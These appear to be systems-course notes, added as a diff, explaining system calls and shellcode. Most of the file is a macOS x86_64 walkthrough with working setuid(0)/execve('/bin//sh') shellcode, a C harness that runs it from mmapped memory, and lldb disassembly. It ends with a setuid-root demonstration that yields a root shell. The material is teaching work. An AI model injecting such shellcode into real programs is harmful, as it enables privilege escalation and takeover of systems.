@@ -1,0 +1,346 @@
+
+========================[ System calls ]========================
+
+To open, read, or write a file (as well as to check on the file's
+permissions, timestamps, or whether the file with a given name
+actually exists), or to create a new process from an executable file,
+your program will somehow need to access the disk.  Information,
+including file names and their access permissions, is stored on the
+disk in binary blocks, and there is a long chain of translations
+between the contents of these block and the standard library functions
+that your language uses to work on files or create new processes.
+
+Somewhere in-between, there is an all-important jump between the
+"userland" code and the operating system code. Think of it as a
+checking funnel; before any change to the OS state (including disk)
+can succeed, it should be checked for consistency and permissions.
+Standard library functions like open(), read(), write(), socket(),
+fork(), exec(), etc. all go through this funnel.
+
+In modern systems, all these calls go through a single entry point in
+the kernel that first checks the ownership and permissions of your
+process vs the permissions of a file or directory, and rejects requests
+that aren't permitted. If they are, this code dispatches the request
+to the particular kernel drivers. 
+
+The most important idea here is that only code past this point can
+affect the internal bookkeeping of the OS, the disk, and of other
+devices. That way, the OS bookkeeping data is kept consistent, and
+can't be maliciously or inadvertently corrupted by userland
+programs. When trying to perform a potentially corrupting action,
+these programs will run into errors or crash, but the OS will
+continue, and your disk data blocks and process table will remain
+consistent.
+
+So in any language the standard system library functions translate the
+requested operations to these primitive OS operations, *system
+calls*. The library calls really serve as wrappers; the system calls
+can be called directly from the binary code.
+
+System calls are a part of the Application Binary Interface (ABI).  A
+program can perform system actions like input, output, or starting
+other programs only through the ABI; otherwise, the system could be
+crashed by any user program doing a wrong thing (as it used to happen
+to MS-DOS, early Windows, and Mac OS prior to Mac OS X).
+
+So standard system libraries serve as mere wrappers around system
+calls.  System calls are accomplished by a special instruction (such
+as SYSCALL, SYSENTER, or INT 0x80, depending on your system) that
+gives control to the kernel, and elevates the privilege of that code
+to a higher level. The data of the disks or of the process table can
+only be read or written at that privilege level (in x86, it is called
+"ring 0", your userland program running at "ring 3"; lower ring number
+means more privilege in x86 terms). 
+
+System calls have their own calling conventions, which may differ from
+the normal function calling conventions (but, in 64-bit code, not
+much, as arguments to system calls are still passed in registers.)
+The biggest difference is that, after the arguments have been staged,
+a function is called with the CALL <address> instruction, whereas the
+system calls are initiated with SYSCALL, SYSENTER, or INT 0x80. There
+is no address the user can specify; instead, all system calls go to
+a single entry point in the kernel, where the user code has no
+control, and where the permissions for the requested operations are
+checked.
+
+Of all systems programming developments since 1990s, this scheme of
+constructing OSes is still the most important in practical terms.  We
+learn the details of it in CS58 and in CS258, but it pays to
+understand it no matter what kind of programming you do.
+
+One important note about the system call ABI and convention: system
+calls have numbers, not names. When making the system call in
+assembly, its number is placed in RAX (or EAX). On {\tt x86_64}, 
+arguments go into registers, in the same order as for function calls,
+with an exception for {\tt rcx} (see the ABI documentation, section A.2.1). 
+Tables of these numbers are different for every OS; see below.
+
+------------------------[ Shell code ]------------------------
+
+Attackers typically don't start with access to the compiler build
+chain on your system and to its standard libraries. However, software
+vulnerabilities occasionally give them the opportunity to inject and
+run some binary code snippets on your system, supplied via a buffer
+overflow or some other memory corruption. 
+
+A binary code snippet that---when your program is somehow tricked 
+into running it---gives the attacker access to a command shell,
+is called "shellcode". It usually combines one or more system calls.
+
+There's a simple way of testing what these code snippets from a C
+program: take the snippet as a string of bytes, copy them to an
+executable memory region, and then JMP or CALL to the address where
+they had been copied. The binary code will execute, and will
+give you shell---from a program whose code looks nothing like
+starting a new process or executing the shell like "/bin/bash"
+or "/bin/sh"!
+
+------------------------[ MacOS X system calls ]------------------------
+
+About MacOS X system calls:
+ https://filippo.io/making-system-calls-from-assembly-in-mac-os-x/
+ http://opensource.apple.com//source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master
+ http://dustin.schultz.io/blog/2010/11/15/mac-os-x-64-bit-assembly-system-calls/
+ https://developer.apple.com/library/content/documentation/Darwin/Conceptual/KernelProgramming/BSD/BSD.html
+
+// Relevant syscalls: 0x17 and 0x17+0x24 
+//   23 AUE_SETUID         ALL  { int setuid(uid_t uid); } 
+//   59 AUE_EXECVE         ALL  { int execve(char *fname, char **argp, char **envp); } 
+
+$ gcc -Wall -o shellcode shellcode.c 
+
+$ cat shellcode.c
+
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+ 
+int (*sc)();
+ 
+char shellcode[] =
+"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
+"\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
+"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
+"\x2f\x73\x68";
+ 
+int main(int argc, char **argv) {
+ 
+    /* create a new executable and writable memory region (in reality, a 4K page) */
+    void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
+            | MAP_PRIVATE, -1, 0);  
+ 
+    if (ptr == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+ 
+    memcpy(ptr, shellcode, sizeof(shellcode));
+    sc = ptr;
+ 
+    sc();
+ 
+    return 0;
+}
+
+
+$ ./shellcode 
+sh-3.2$ exit
+
+$ lldb ./shellcode
+(lldb) target create "./shellcode"
+2016-09-28 15:55:45.708 lldb[2026:102216] Metadata.framework [Error]: couldn't get the client port
+Current executable set to './shellcode' (x86_64).
+
+(lldb) run
+Process 2029 launched: './shellcode' (x86_64)
+Process 2029 stopped
+* thread #1: tid = 0x18f4c, 0x00007fff5fc01000 dyld`_dyld_start, stop reason = exec
+    frame #0: 0x00007fff5fc01000 dyld`_dyld_start
+dyld`_dyld_start:
+->  0x7fff5fc01000 <+0>: popq   %rdi
+    0x7fff5fc01001 <+1>: pushq  $0x0
+    0x7fff5fc01003 <+3>: movq   %rsp, %rbp
+    0x7fff5fc01006 <+6>: andq   $-0x10, %rsp
+
+(lldb) help disas
+
+<skipped>
+
+(lldb) disas -p
+dyld`_dyld_start:
+->  0x7fff5fc01000 <+0>: popq   %rdi
+    0x7fff5fc01001 <+1>: pushq  $0x0
+    0x7fff5fc01003 <+3>: movq   %rsp, %rbp
+    0x7fff5fc01006 <+6>: andq   $-0x10, %rsp
+
+(lldb) b main
+Breakpoint 1: no locations (pending).
+WARNING:  Unable to resolve breakpoint to any actual locations.
+
+(lldb) run
+There is a running process, kill it and restart?: [Y/n] y
+Process 2029 exited with status = 9 (0x00000009) 
+Process 2048 launched: '/usr/lib/dyld' (x86_64)
+1 location added to breakpoint 1
+Process 2048 stopped
+* thread #1: tid = 0x1910a, 0x0000000100000e80 shellcode`main, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+    frame #0: 0x0000000100000e80 shellcode`main
+shellcode`main:
+->  0x100000e80 <+0>: pushq  %rbp
+    0x100000e81 <+1>: movq   %rsp, %rbp
+    0x100000e84 <+4>: subq   $0x30, %rsp
+    0x100000e88 <+8>: xorl   %eax, %eax
+
+(lldb) ^D
+
+
+$ lldb ./shellcode
+(lldb) target create "./shellcode"
+2016-09-28 15:58:19.633 lldb[2063:102952] Metadata.framework [Error]: couldn't get the client port
+Current executable set to './shellcode' (x86_64).
+
+(lldb) b main
+Breakpoint 1: where = shellcode`main, address = 0x0000000100000e80
+
+(lldb) run
+Process 2064 launched: './shellcode' (x86_64)
+Process 2064 stopped
+* thread #1: tid = 0x19237, 0x0000000100000e80 shellcode`main, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+    frame #0: 0x0000000100000e80 shellcode`main
+shellcode`main:
+->  0x100000e80 <+0>: pushq  %rbp
+    0x100000e81 <+1>: movq   %rsp, %rbp
+    0x100000e84 <+4>: subq   $0x30, %rsp
+    0x100000e88 <+8>: xorl   %eax, %eax
+
+(lldb) target var shellcode
+error: can't find global variable 'shellcode'
+
+(lldb) ^D
+
+$ gcc -g -Wall -o shellcode shellcode.c 
+
+$ lldb ./shellcode
+(lldb) target create "./shellcode"
+2016-09-28 16:00:20.901 lldb[2080:103442] Metadata.framework [Error]: couldn't get the client port
+Current executable set to './shellcode' (x86_64).
+
+(lldb) ta v shellcode
+(char [52]) shellcode = "A?\x02I??\x18I\x83?1?L\x89?\x05?_I\x83?$L\x89?H1?RWH\x89??????/bin//sh"
+
+(lldb) disas -s shellcode
+error: address expression "shellcode" resulted in a value whose type can't be converted to an address: char [52]
+
+(lldb) disas -s &shellcode[0]
+shellcode`shellcode:
+shellcode[0x100001030] <+0>:  movb   $0x2, %r8b
+shellcode[0x100001033] <+3>:  shlq   $0x18, %r8
+shellcode[0x100001037] <+7>:  orq    $0x17, %r8
+shellcode[0x10000103b] <+11>: xorl   %edi, %edi
+shellcode[0x10000103d] <+13>: movq   %r8, %rax
+shellcode[0x100001040] <+16>: syscall 
+shellcode[0x100001042] <+18>: jmp    0x100001056               ; shellcode + 38
+shellcode[0x100001044] <+20>: popq   %rdi
+shellcode[0x100001045] <+21>: addq   $0x24, %r8
+shellcode[0x100001049] <+25>: movq   %r8, %rax
+shellcode[0x10000104c] <+28>: xorq   %rdx, %rdx
+shellcode[0x10000104f] <+31>: pushq  %rdx
+
+(lldb) disas -b -s &shellcode[0]
+shellcode`shellcode:
+shellcode[0x100001030] <+0>:  41 b0 02     movb   $0x2, %r8b
+shellcode[0x100001033] <+3>:  49 c1 e0 18  shlq   $0x18, %r8
+shellcode[0x100001037] <+7>:  49 83 c8 17  orq    $0x17, %r8
+shellcode[0x10000103b] <+11>: 31 ff        xorl   %edi, %edi
+shellcode[0x10000103d] <+13>: 4c 89 c0     movq   %r8, %rax
+shellcode[0x100001040] <+16>: 0f 05        syscall 
+shellcode[0x100001042] <+18>: eb 12        jmp    0x100001056               ; shellcode + 38
+shellcode[0x100001044] <+20>: 5f           popq   %rdi
+shellcode[0x100001045] <+21>: 49 83 c0 24  addq   $0x24, %r8
+shellcode[0x100001049] <+25>: 4c 89 c0     movq   %r8, %rax
+shellcode[0x10000104c] <+28>: 48 31 d2     xorq   %rdx, %rdx
+shellcode[0x10000104f] <+31>: 52           pushq  %rdx
+
+(lldb) disas -b -s &shellcode[0] -e &shellcode[sizeof(shellcode)]
+shellcode`shellcode:
+shellcode[0x100001030] <+0>:  41 b0 02        movb   $0x2, %r8b
+shellcode[0x100001033] <+3>:  49 c1 e0 18     shlq   $0x18, %r8
+shellcode[0x100001037] <+7>:  49 83 c8 17     orq    $0x17, %r8
+shellcode[0x10000103b] <+11>: 31 ff           xorl   %edi, %edi
+shellcode[0x10000103d] <+13>: 4c 89 c0        movq   %r8, %rax
+shellcode[0x100001040] <+16>: 0f 05           syscall 
+shellcode[0x100001042] <+18>: eb 12           jmp    0x100001056               ; shellcode + 38
+shellcode[0x100001044] <+20>: 5f              popq   %rdi
+shellcode[0x100001045] <+21>: 49 83 c0 24     addq   $0x24, %r8
+shellcode[0x100001049] <+25>: 4c 89 c0        movq   %r8, %rax
+shellcode[0x10000104c] <+28>: 48 31 d2        xorq   %rdx, %rdx
+shellcode[0x10000104f] <+31>: 52              pushq  %rdx
+shellcode[0x100001050] <+32>: 57              pushq  %rdi
+shellcode[0x100001051] <+33>: 48 89 e6        movq   %rsp, %rsi
+shellcode[0x100001054] <+36>: 0f 05           syscall 
+shellcode[0x100001056] <+38>: e8 e9 ff ff ff  callq  0x100001044               ; shellcode + 20
+
+(lldb) mem read -fx -s1 shellcode
+error: invalid start address expression.
+error: address expression "shellcode" resulted in a value whose type can't be converted to an address: char [52]
+
+(lldb) mem read -fx -s1 &shellcode[0]
+0x100001030: 0x41 0xb0 0x02 0x49 0xc1 0xe0 0x18 0x49
+
+(lldb) 
+0x100001038: 0x83 0xc8 0x17 0x31 0xff 0x4c 0x89 0xc0
+
+(lldb) 
+0x100001040: 0x0f 0x05 0xeb 0x12 0x5f 0x49 0x83 0xc0
+
+(lldb) 
+0x100001048: 0x24 0x4c 0x89 0xc0 0x48 0x31 0xd2 0x52
+
+(lldb) mem read -fc -s1 &shellcode[0]
+0x100001030: A?\x02I??\x18I\x83?\x171?L\x89?\x0f\x05?\x12_I\x83?$L\x89?H1?R
+0x100001050: WH\x89?\x0f\x05?????/bin//sh\0\0\0\0\0\0\0\0\0\0\0\0\0
+warning: Not all bytes (52/64) were able to be read from 0x100001030.
+
+(lldb) disas -b -s &shellcode[0] -e &shellcode[sizeof(shellcode)]
+shellcode`shellcode:
+shellcode[0x100001030] <+0>:  41 b0 02        movb   $0x2, %r8b
+shellcode[0x100001033] <+3>:  49 c1 e0 18     shlq   $0x18, %r8
+shellcode[0x100001037] <+7>:  49 83 c8 17     orq    $0x17, %r8
+shellcode[0x10000103b] <+11>: 31 ff           xorl   %edi, %edi
+shellcode[0x10000103d] <+13>: 4c 89 c0        movq   %r8, %rax
+shellcode[0x100001040] <+16>: 0f 05           syscall 
+shellcode[0x100001042] <+18>: eb 12           jmp    0x100001056               ; shellcode + 38
+shellcode[0x100001044] <+20>: 5f              popq   %rdi
+shellcode[0x100001045] <+21>: 49 83 c0 24     addq   $0x24, %r8
+shellcode[0x100001049] <+25>: 4c 89 c0        movq   %r8, %rax
+shellcode[0x10000104c] <+28>: 48 31 d2        xorq   %rdx, %rdx
+shellcode[0x10000104f] <+31>: 52              pushq  %rdx
+shellcode[0x100001050] <+32>: 57              pushq  %rdi
+shellcode[0x100001051] <+33>: 48 89 e6        movq   %rsp, %rsi
+shellcode[0x100001054] <+36>: 0f 05           syscall 
+shellcode[0x100001056] <+38>: e8 e9 ff ff ff  callq  0x100001044               ; shellcode + 20
+
+(lldb) ^D
+
+$ sudo bash
+Password:
+bash-3.2# chown root ./shellcode
+bash-3.2# chmod u+s ./shellcode
+bash-3.2# exit
+
+$ ls -l shellcode
+-rwsr-xr-x 1 root staff 9000 Sep 28 16:00 shellcode
+
+$ ./shellcode
+sh-3.2# id
+uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh),702(com.apple.sharepoint.group.2)
+sh-3.2# exit
+
+$ mv shellcode shellcode-suid
+
+$ ./shellcode-suid 
+sh-3.2# id
+uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh),702(com.apple.sharepoint.group.2)
+
+
